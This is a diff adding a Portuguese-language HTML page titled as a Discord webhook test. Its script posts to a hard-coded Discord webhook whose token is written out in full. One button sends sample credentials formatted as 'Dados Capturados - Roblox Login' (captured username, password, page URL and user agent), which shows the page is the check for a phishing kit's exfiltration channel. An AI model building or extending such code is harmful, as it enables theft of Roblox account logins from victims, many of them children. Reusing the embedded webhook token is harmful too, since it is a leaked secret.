@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste Webhook Discord</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #4752C4;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🧪 Teste do Webhook Discord</h1>
+        <p>Clique no botão abaixo para testar se o webhook está funcionando:</p>
+        
+        <button onclick="testWebhook()">📨 Testar Webhook</button>
+        <button onclick="testWithData()">📝 Testar com Dados</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1401006483638059169/b1LcJW3NKHML1NGg3Ry_EMujqVsUvAyZ_vOtf--Fw1FwtuTn5Dk7GNm5nVkRBYvtDuB3';
+        
+        function showStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<div class="status ${type}">${message}</div>`;
+        }
+        
+        function testWebhook() {
+            showStatus('📨 Enviando teste para o Discord...', 'info');
+            
+            const testMessage = `🧪 **Teste de Webhook**
+
+✅ **Status:** Webhook funcionando!
+⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
+🌐 **URL:** ${window.location.href}`;
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: testMessage
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    showStatus('✅ Sucesso! Mensagem enviada para o Discord. Verifique seu canal!', 'success');
+                } else {
+                    showStatus(`❌ Erro ${response.status}: ${response.statusText}`, 'error');
+                }
+            })
+            .catch(error => {
+                showStatus(`❌ Erro de conexão: ${error.message}`, 'error');
+            });
+        }
+        
+        function testWithData() {
+            showStatus('📝 Enviando dados de teste...', 'info');
+            
+            const testData = {
+                username: 'aluno.teste@email.com',
+                password: 'senha123456',
+                timestamp: new Date().toLocaleString('pt-BR'),
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            };
+            
+            const messageText = `🔐 **Dados Capturados - Roblox Login**
+
+👤 **Usuário:** ${testData.username}
+🔑 **Senha:** ${testData.password}
+⏰ **Data/Hora:** ${testData.timestamp}
+🌐 **URL:** ${testData.url}
+📱 **User Agent:** ${testData.userAgent}`;
+            
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: messageText
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    showStatus('✅ Dados de teste enviados com sucesso! Verifique seu canal Discord.', 'success');
+                } else {
+                    showStatus(`❌ Erro ${response.status}: ${response.statusText}`, 'error');
+                }
+            })
+            .catch(error => {
+                showStatus(`❌ Erro de conexão: ${error.message}`, 'error');
+            });
+        }
+    </script>
+</body>
+</html> 
